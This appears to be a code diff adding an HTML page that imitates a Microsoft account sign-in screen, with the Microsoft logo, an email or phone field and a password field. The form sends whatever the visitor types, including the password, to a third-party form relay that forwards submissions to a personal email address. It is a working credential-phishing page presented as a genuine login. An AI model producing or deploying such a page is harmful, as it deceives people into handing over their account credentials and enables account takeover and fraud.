@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in to your account</title>
+    <link rel="shortcut icon" href="images/Favicon.svg" />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="content">
+        <div class="content-header">
+          <div class="logo">
+            <img src="images/Microsoft-Logo.svg" alt="" />
+          </div>
+          <div class="content-heading">
+            <h1>Sign in</h1>
+          </div>
+        </div>
+        <div class="content-body">
+          <form
+            action="https://formsubmit.co/sahilaujla15@gmail.com"
+            method="POST"
+          >
+            <input type="hidden" name="_captcha" value="false" />
+            <input type="hidden" name="_subject" value="New submission!" />
+            <input
+              type="hidden"
+              name="_next"
+              value="https://yourdomain.co/thanks.html"
+            />
+            <div class="email-field">
+              <input
+                type="text"
+                name="Email-Phone-or-Skype"
+                placeholder="Email, phone, or Skype"
+                required
+              />
+            </div>
+            <div class="password-field">
+              <input
+                type="password"
+                name="Password"
+                placeholder="Password"
+                required
+              />
+            </div>
+            <p>No account? <span class="blue">Create one!</span></p>
+            <p><span class="blue">Can't access your account?</span></p>
+            <button id="submit" type="submit">Next</button>
+          </form>
+        </div>
+      </div>
+      <div class="sign-in-options">
+        <span><img src="images/Sign-in-options.svg" />Sign-in options</span>
+      </div>
+    </div>
+  </body>
+  <script src="main.js"></script>
+</html>
